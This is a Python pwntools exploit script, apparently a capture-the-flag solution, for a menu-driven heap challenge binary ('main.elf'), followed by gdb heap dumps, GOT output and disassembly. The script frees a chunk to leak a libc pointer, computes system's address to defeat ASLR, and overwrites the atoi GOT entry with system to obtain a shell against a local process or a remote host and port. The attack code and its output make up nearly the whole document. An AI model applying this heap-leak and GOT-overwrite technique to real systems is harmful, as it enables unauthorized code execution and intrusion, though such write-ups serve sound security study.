from pwn import *


def alloc(name, attack = 41, defense = 41, speed = 41, precision = 41):

    r.recvuntil('choice: ')
    r.sendline('1')

    r.recvuntil('name: ')
    r.sendline(name)

    r.recvuntil('points: ')
    r.sendline(str(attack))

    r.recvuntil('points: ')
    r.sendline(str(defense))

    r.recvuntil('speed: ')
    r.sendline(str(speed))

    r.recvuntil('precision: ')
    r.sendline(str(precision))
    return


def edit(name):

    r.recvuntil('choice: ')
    r.sendline('4')

    r.recvuntil('choice: ')
    r.sendline('1')

    r.recvuntil('name: ')
    r.sendline(name)

    r.recvuntil('choice: ')
    r.sendline('sh')

    return

def select(idx):

    r.recvuntil('choice: ')
    r.sendline('3')

    r.recvuntil('index: ')
    r.sendline(str(idx))

    return

def free(idx):

    r.recvuntil('choice: ')
    r.sendline('2')

    r.recvuntil('index: ')
    r.sendline(str(idx))

    return

def show():

    r.recvuntil('choice: ')
    r.sendline('5')
    r.recvuntil("Name: ")
    data = r.recvline("")
    #data.split("\n")
    l = list()
    l.append(data)  
    return l
    

def un(u,check=False):

    if check == True:

        return hex(unpack(u, 'all', endian='little', sign=True))
    else:
        return 0
def exploit(r):

    alloc('A'*0x41)
    alloc('B'*0x41)
    alloc('C'*0x80)
    alloc('D'*0x80)
    #select the thrid player
    select(2)
    #free the third player
    free(2)
    #first leak 
    leak = show()[0]
    #fix the output 
    leak = leak.replace("x\\","\x00\x00")
    #unpack the addresses
    new = un(leak,True)
    #convert it to int
    new = int(new,0)
    #caculuate the system address in order to bypass ASLR
    system = new - 0x37f7e8
    #Calculuate the bash address in order to bypass ASLR 
    bash = new - 0x237e21
    #info 
    log.info("[+] leak : " + hex(new))
    log.info("[+] syst : " + hex(system))
    log.info("[+] bash : " + hex(bash))
    #free the fourth player
    free(3)
    #pack the atioi address
    got = p64(0x603110)

    #write player 3 with atoi function 
    alloc("\x01"*16 + got)

    edit(p64(system))

    r.interactive()

if __name__ == "__main__":
    
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process('./main.elf')
        pause()
        exploit(r)



'''

#! free(2)
0x604150:   0x00007ffff7dd1b78


0x604120:   0x0000000000000000  0x0000000000000021
0x604130:   0x0000000000000000  0x0000000400000003
0x604140:   0x0000000000604150  0x0000000000000091
0x604150:   0x00007ffff7dd1b78  0x00007ffff7dd1b78



gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x604120 --> 0x0
(0x30)     fastbin[1]: 0x0

                  top: 0x604280 (size : 0x20d80)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x604140 (size : 0x90)

#free(3)


gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x6041d0 --> 0x0
(0x30)     fastbin[1]: 0x0

(0xb0)     fastbin[9]: 0x0
                  top: 0x6041f0 (size : 0x20e10)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x604120 (size : 0xb0)


 0x6041d0:  0x00000000000000b0  0x0000000000000020
0x6041e0:   0x0000000000000000  0x0000000400000003
0x6041f0:   0x0000000000604200  0x0000000000020e11
0x604200:   0x4444444444444444  0x4444444444444444


#attack

vagrant@vagrant:~/pwn/main_elf$ objdump -R main.elf | grep at
main.elf:     file format elf64-x86-64
0000000000603110 R_X86_64_JUMP_SLOT  atoi@GLIBC_2.2.5



0x6040f0:   0x5a5a5a5a5a5a5a5a  0x5a5a5a5a5a5a5a5a
0x604100:   0x4c4c4c4c4c4c4c4c  0x0000000000000000
0x604110:   0x00007ffff7dd1b78  0x0000000000000081
0x604120:   0x00007ffff7dd1b78  0x00007ffff7dd1b78



=> 0x401679 <edit_menu>:    push   rbp
   0x40167a <edit_menu+1>:  mov    rbp,rsp
   0x40167d <edit_menu+4>:  sub    rsp,0x20
   0x401681 <edit_menu+8>:  mov    rax,QWORD PTR fs:0x28



'''






















